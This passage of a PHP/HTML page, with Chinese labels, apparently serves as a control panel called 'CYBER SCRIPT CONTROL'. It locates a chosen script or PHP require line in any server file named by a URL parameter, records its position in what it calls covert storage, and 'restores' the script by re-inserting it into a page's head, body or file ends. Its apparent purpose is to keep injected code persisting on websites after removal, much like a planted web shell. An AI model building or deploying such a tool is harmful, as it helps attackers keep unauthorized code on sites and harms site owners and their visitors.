            box-shadow: 0 8px 25px rgba(0, 243, 255, 0.6);
        }

        .cyber-btn-success {
            background: linear-gradient(45deg, var(--neon-green), #00cc88);
            color: white;
            box-shadow: 0 5px 15px rgba(5, 255, 161, 0.4);
        }

        .cyber-btn-success:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(5, 255, 161, 0.6);
        }

        .cyber-btn-warning {
            background: linear-gradient(45deg, var(--neon-yellow), #ff9800);
            color: #000;
            box-shadow: 0 5px 15px rgba(255, 235, 59, 0.4);
        }

        .cyber-btn-warning:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 235, 59, 0.6);
        }

        .cyber-btn-danger {
            background: linear-gradient(45deg, var(--neon-pink), #ff0055);
            color: white;
            box-shadow: 0 5px 15px rgba(255, 42, 109, 0.4);
        }

        .cyber-btn-danger:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 42, 109, 0.6);
        }

        .cyber-btn-outline {
            background: transparent;
            color: var(--neon-blue);
            border: 2px solid var(--neon-blue);
            box-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
        }

        .cyber-btn-outline:hover {
            background: var(--neon-blue);
            color: #000;
            box-shadow: var(--glow-blue);
        }

        .btn-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .file-info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }

        .info-card {
            background: rgba(20, 20, 40, 0.6);
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 10px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .info-card:hover {
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
        }

        .info-label {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .info-value {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--text-primary);
            word-break: break-all;
        }

        .file-path-display {
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.85rem;
            color: var(--neon-green);
            background: rgba(5, 30, 30, 0.6);
            padding: 10px 15px;
            border-radius: 8px;
            border-left: 3px solid var(--neon-green);
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px rgba(5, 255, 161, 0.2);
        }

        .file-path-display:hover {
            box-shadow: 0 0 20px rgba(5, 255, 161, 0.4);
            transform: translateX(5px);
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .status-success {
            background: rgba(5, 255, 161, 0.2);
            color: var(--neon-green);
            border: 1px solid var(--neon-green);
            box-shadow: 0 0 10px rgba(5, 255, 161, 0.3);
        }

        .status-error {
            background: rgba(255, 42, 109, 0.2);
            color: var(--neon-pink);
            border: 1px solid var(--neon-pink);
            box-shadow: 0 0 10px rgba(255, 42, 109, 0.3);
        }

        .cyber-select {
            padding: 12px 20px;
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 8px;
            background: rgba(10, 10, 30, 0.8);
            color: var(--text-primary);
            font-size: 14px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .cyber-select:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: var(--glow-blue);
        }

        .cyber-alert {
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid;
            background: rgba(20, 20, 40, 0.8);
            backdrop-filter: blur(10px);
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from { transform: translateX(-100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .alert-success {
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(5, 255, 161, 0.2);
        }

        .alert-warning {
            border-color: var(--neon-yellow);
            box-shadow: 0 0 20px rgba(255, 235, 59, 0.2);
        }

        .alert-error {
            border-color: var(--neon-pink);
            box-shadow: 0 0 20px rgba(255, 42, 109, 0.2);
        }

        .alert-info {
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
        }

        .script-preview {
            background: rgba(5, 10, 20, 0.9);
            color: var(--neon-green);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 13px;
            line-height: 1.4;
            word-break: break-all;
            white-space: pre-wrap;
            border: 1px solid rgba(5, 255, 161, 0.3);
            box-shadow: 0 0 15px rgba(5, 255, 161, 0.2);
        }

        .positions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }

        .position-card {
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 15px;
            padding: 25px;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .position-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
        }

        .position-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 15px 40px rgba(0, 243, 255, 0.3);
        }

        .management-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: space-between;
            margin: 30px 0;
            padding: 25px;
            background: rgba(20, 20, 40, 0.6);
            border-radius: 15px;
            border: 1px solid rgba(0, 243, 255, 0.2);
        }

        /* 响应式设计 */
        @media (max-width: 768px) {
            .app-container {
                padding: 15px;
            }

            .cyber-header {
                padding: 40px 20px;
                margin-bottom: 30px;
            }

            .cyber-header h1 {
                font-size: 2.5rem;
            }

            .btn-group {
                flex-direction: column;
            }

            .cyber-btn {
                width: 100%;
            }

            .positions-grid {
                grid-template-columns: 1fr;
            }

            .management-actions {
                flex-direction: column;
            }
            
            .cyber-select {
                width: 100%;
                margin-bottom: 10px;
            }
        }

        /* 特殊效果 */
        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 243, 255, 0.7); }
            70% { box-shadow: 0 0 0 20px rgba(0, 243, 255, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 243, 255, 0); }
        }

        .glitch-text {
            position: relative;
            animation: glitch 5s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
    <script>
        function showImport() {
            const importForm = document.getElementById('importForm');
            importForm.style.display = importForm.style.display === 'block' ? 'none' : 'block';
        }

        function syncScriptToAll() {
            const checkScript = document.getElementById('check_script').value;
            document.getElementById('custom_script').value = checkScript;
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                // 创建酷炫的Toast通知
                const toast = document.createElement('div');
                toast.style.cssText = `
                    position: fixed;
                    top: 30px;
                    right: 30px;
                    background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
                    color: #000;
                    padding: 15px 25px;
                    border-radius: 10px;
                    z-index: 10000;
                    font-weight: 600;
                    box-shadow: 0 5px 20px rgba(5, 255, 161, 0.5);
                    animation: slideInRight 0.5s ease-out;
                `;
                toast.textContent = '✅ 已复制到剪贴板';
                document.body.appendChild(toast);
                setTimeout(() => {
                    toast.style.animation = 'slideOutRight 0.5s ease-in';
                    setTimeout(() => toast.remove(), 500);
                }, 2000);
            });
        }

        // 创建动态粒子背景
        function createParticles() {
            const container = document.querySelector('.floating-particles');
            const particleCount = 50;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                
                const size = Math.random() * 6 + 2;
                const colors = ['#00f3ff', '#b967ff', '#ff2a6d', '#05ffa1'];
                const color = colors[Math.floor(Math.random() * colors.length)];
                
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.background = color;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                particle.style.animationDelay = `${Math.random() * 6}s`;
                particle.style.opacity = Math.random() * 0.6 + 0.2;
                
                container.appendChild(particle);
            }
        }

        // 添加按钮点击效果
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
            
            const buttons = document.querySelectorAll('.cyber-btn');
            buttons.forEach(btn => {
                btn.addEventListener('click', function(e) {
                    const ripple = document.createElement('span');
                    const rect = this.getBoundingClientRect();
                    const size = Math.max(rect.width, rect.height);
                    const x = e.clientX - rect.left - size / 2;
                    const y = e.clientY - rect.top - size / 2;
                    
                    ripple.style.cssText = `
                        position: absolute;
                        border-radius: 50%;
                        background: rgba(255, 255, 255, 0.6);
                        transform: scale(0);
                        animation: ripple 0.6s linear;
                        pointer-events: none;
                        width: ${size}px;
                        height: ${size}px;
                        left: ${x}px;
                        top: ${y}px;
                    `;
                    
                    this.appendChild(ripple);
                    setTimeout(() => ripple.remove(), 600);
                });
            });
        });

        // 自动隐藏成功消息
        setTimeout(() => {
            const alerts = document.querySelectorAll('.cyber-alert');
            alerts.forEach(alert => {
                alert.style.opacity = '0.7';
            });
        }, 5000);
    </script>
</head>
<body>
    <!-- 网格背景 -->
    <div class="cyber-grid"></div>
    
    <!-- 浮动粒子 -->
    <div class="floating-particles"></div>

    <div class="app-container">
        <!-- 头部 -->
        <div class="cyber-header">
            <h1 class="glitch-text">🔮 CYBER SCRIPT CONTROL</h1>
            <div class="subtitle">ADVANCED SCRIPT MANAGEMENT SYSTEM</div>
        </div>

        <!-- 脚本检测区域 -->
        <div class="cyber-card">
            <div class="card-header">
                <div class="card-icon">🎯</div>
                <h2>脚本检测模块</h2>
            </div>
            
            <div class="script-input-container">
                <form method="post">
                    <label style="display: block; margin-bottom: 12px; font-weight: 500; color: var(--text-secondary);">输入要检测的脚本代码:</label>
                    <textarea name="check_script" id="check_script" class="cyber-input" placeholder="请输入要检测的脚本代码，例如：&lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 或 &lt;?php require...?&gt;" oninput="syncScriptToAll()"><?php echo htmlspecialchars($currentScript); ?></textarea>
                    
                    <div class="btn-group" style="margin-top: 20px;">
                        <button type="submit" name="action" value="check" class="cyber-btn cyber-btn-primary pulse">
                            🔍 检测脚本
                        </button>
                    </div>
                    
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                </form>
            </div>
            
            <div class="current-script-display">
                <div style="font-weight: 600; margin-bottom: 10px; color: var(--neon-green);">当前检测脚本:</div>
                <div><?php echo htmlspecialchars($currentScript); ?></div>
            </div>
        </div>

        <!-- 文件信息区域 -->
        <div class="cyber-card">
            <div class="card-header">
                <div class="card-icon">📁</div>
                <h2>目标文件分析</h2>
            </div>
            
            <div class="file-info-grid">
                <div class="info-card">
                    <div class="info-label">当前文件</div>
                    <div class="info-value"><?php echo htmlspecialchars($filePath ? basename($filePath) : '未选择文件'); ?></div>
                </div>
                <div class="info-card">
                    <div class="info-label">完整路径</div>
                    <div class="file-path-display" onclick="copyToClipboard('<?php echo htmlspecialchars($filePath); ?>')" title="点击复制">
                        <?php 
                        $resolvedPath = getAbsolutePath($filePath);
                        echo htmlspecialchars($filePath ?: '请通过URL参数 s=文件路径 指定文件'); 
                        if ($filePath && $resolvedPath !== $filePath) {
                            echo "<br><small>解析为: " . htmlspecialchars($resolvedPath) . "</small>";
                        }
                        ?>
                    </div>
                </div>
                <div class="info-card">
                    <div class="info-label">文件状态</div>
                    <div class="status-badge <?php echo (!empty($filePath) && safeFileExists($filePath)) ? 'status-success' : 'status-error'; ?>">
                        <?php 
                        if (!empty($filePath)) {
                            $resolvedPath = getAbsolutePath($filePath);
                            echo safeFileExists($filePath) ? '✅ 文件存在' : '❌ 文件不存在'; 
                            if (!safeFileExists($filePath)) {
                                echo "<br><small>尝试路径: " . htmlspecialchars($resolvedPath) . "</small>";
                            }
                        } else {
                            echo '❌ 文件不存在';
                        }
                        ?>
                    </div>
                </div>
                <?php if (!empty($filePath) && safeFileExists($filePath)): ?>
                <div class="info-card">
                    <div class="info-label">文件大小</div>
                    <div class="info-value"><?php 
                    $resolvedPath = getAbsolutePath($filePath);
                    echo round(filesize($resolvedPath) / 1024, 2); ?> KB</div>
                </div>
                <?php endif; ?>
            </div>
            
            <?php if (!empty($filePath) && safeFileExists($filePath)): ?>
            <div class="btn-group">
                <form method="post" style="display: inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                    <input type="hidden" name="custom_script" id="custom_script" value="<?php echo htmlspecialchars($currentScript); ?>">
                    <button type="submit" name="action" value="save_position" class="cyber-btn cyber-btn-primary">
                        💾 保存位置
                    </button>
                </form>
                
                <form method="post" style="display: inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                    <input type="hidden" name="custom_script" value="<?php echo htmlspecialchars($currentScript); ?>">
                    <button type="submit" name="action" value="auto_restore" class="cyber-btn cyber-btn-success">
                        🎯 自动恢复
                    </button>
                </form>
                
                <form method="post" style="display: inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                    <input type="hidden" name="custom_script" value="<?php echo htmlspecialchars($currentScript); ?>">
                    <select name="insert_location" class="cyber-select">
                        <option value="head">📄 插入到 head 标签内</option>
                        <option value="body_start">🚀 插入到 body 开始处</option>
                        <option value="body_end">🔚 插入到 body 结束前</option>
                        <option value="file_start">📝 插入到文件开头</option>
                        <option value="file_end">🏁 插入到文件末尾</option>
                    </select>
                    <button type="submit" name="action" value="restore" class="cyber-btn cyber-btn-warning">
                        执行恢复
                    </button>
                </form>
            </div>
            <?php endif; ?>
        </div>

        <!-- 操作结果区域 -->
        <?php if (!empty($filePath) && safeFileExists($filePath)): ?>
        <div class="cyber-card">
            <div class="card-header">
                <div class="card-icon">📊</div>
                <h2>操作结果</h2>
            </div>
            <?php
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                // 结果显示区域
            } else {
                echo '<div class="cyber-alert alert-info">请使用上方的检测功能开始操作...</div>';
            }
            ?>
        </div>
        <?php endif; ?>

        <!-- 位置管理系统 -->
        <div class="cyber-card">
            <div class="card-header">
                <div class="card-icon">💾</div>
                <h2>隐蔽存储管理系统</h2>
            </div>
            
            <?php
            $positions = readStoredPositions();
            ?>
            
            <!-- 存储信息 -->
            <?php showStorageInfo(); ?>

            <!-- 位置列表 -->
            <?php if (empty($positions)): ?>
            <div style="text-align: center; padding: 60px 20px; color: var(--text-secondary); border: 2px dashed rgba(0, 243, 255, 0.3); border-radius: 15px;">
                <div style="font-size: 4rem; margin-bottom: 20px; opacity: 0.5;">📝</div>
                <h3 style="margin-bottom: 15px; color: var(--text-secondary);">暂无保存的脚本位置信息</h3>
                <p>使用上方的检测功能找到脚本后，可以保存位置以便后续快速恢复</p>
            </div>
            <?php else: ?>
            <div style="margin: 25px 0;">
                <div class="cyber-alert alert-success">✅ 当前已存储 <?php echo count($positions); ?> 个文件的位置信息</div>
            </div>
            
            <div class="positions-grid">
                <?php foreach ($positions as $fileHash => $info): ?>
                <div class="position-card">
                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 15px;">
                        <div style="font-weight: 600; color: var(--text-primary);"><?php echo basename($info['file']); ?></div>
                        <div style="background: var(--neon-blue); color: #000; padding: 5px 12px; border-radius: 15px; font-size: 0.8rem; font-weight: 600; box-shadow: var(--glow-blue);">
                            第 <?php echo $info['line']; ?> 行
                        </div>
                    </div>
                    
                    <div class="file-path-display" style="margin-bottom: 15px; font-size: 0.8rem;" onclick="copyToClipboard('<?php echo htmlspecialchars($info['file']); ?>')" title="点击复制完整路径">
                        <?php echo htmlspecialchars($info['file']); ?>
                    </div>
                    
                    <div class="script-preview" title="<?php echo htmlspecialchars($info['target_script']); ?>">
                        <?php echo htmlspecialchars($info['target_script']); ?>
                    </div>
                    
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-size: 0.85rem; color: var(--text-secondary);">
                        <span>保存于: <?php echo $info['saved_at']; ?></span>
                    </div>
                    
                    <div class="btn-group">
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="file_path" value="<?php echo $info['file']; ?>">
                            <input type="hidden" name="custom_script" value="<?php echo htmlspecialchars($info['target_script']); ?>">
                            <button type="submit" name="action" value="auto_restore" class="cyber-btn cyber-btn-primary" style="padding: 10px 15px; font-size: 0.8rem;">
                                自动恢复
                            </button>
                        </form>
                        
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="file_path" value="<?php echo $info['file']; ?>">
                            <input type="hidden" name="custom_script" value="<?php echo htmlspecialchars($info['target_script']); ?>">
                            <select name="insert_location" class="cyber-select" style="font-size: 0.7rem; padding: 8px 12px;">
                                <option value="head">head标签</option>
                                <option value="body_start">body开始</option>
                                <option value="body_end">body结束</option>
                                <option value="file_start">文件开头</option>
                                <option value="file_end">文件末尾</option>
                            </select>
                            <button type="submit" name="action" value="restore" class="cyber-btn cyber-btn-warning" style="padding: 10px 15px; font-size: 0.8rem;">
                                恢复
                            </button>
                        </form>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>

            <!-- 管理操作 -->
            <div class="management-actions">
                <div class="btn-group">
                    <form method="post" style="display: inline;">
                        <button type="submit" name="action" value="export_positions" class="cyber-btn cyber-btn-outline">
                            📤 导出位置
                        </button>
                    </form>
                    
                    <button type="button" onclick="showImport()" class="cyber-btn cyber-btn-outline">
                        📥 导入位置
                    </button>
                    
                    <form method="post" style="display: inline;">
                        <button type="submit" name="action" value="change_storage" class="cyber-btn cyber-btn-outline">
                            🔄 更改存储
                        </button>
                    </form>
                </div>
                
                <div class="btn-group">
                    <form method="post" style="display: inline;">
                        <button type="submit" name="action" value="cleanup_storage" class="cyber-btn cyber-btn-outline" onclick="return confirm('确定要清理所有历史存储文件吗？当前数据不会丢失')">
                            🧹 清理存储
                        </button>
                    </form>
                    
                    <form method="post" style="display: inline;">
                        <button type="submit" name="action" value="clear_positions" class="cyber-btn cyber-btn-danger" onclick="return confirm('确定要清除所有保存的位置吗？此操作也会清理存储历史')">
                            🗑️ 清除所有
                        </button>
                    </form>
                </div>
            </div>

            <!-- 导入表单 -->
            <div id="importForm" class="cyber-card" style="display: none; margin-top: 25px;">
                <form method="post">
                    <label style="display: block; margin-bottom: 12px; font-weight: 500; color: var(--text-secondary);">导入位置数据:</label>
                    <textarea name="import_data" class="cyber-input" placeholder="粘贴导出的位置代码..." style="height: 120px;"></textarea>
                    <button type="submit" name="action" value="import_positions" class="cyber-btn cyber-btn-success" style="margin-top: 15px;">
                        确认导入
                    </button>
                </form>
            </div>
        </div>
    </div>

    <style>
        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
    </style>
</body>
</html>
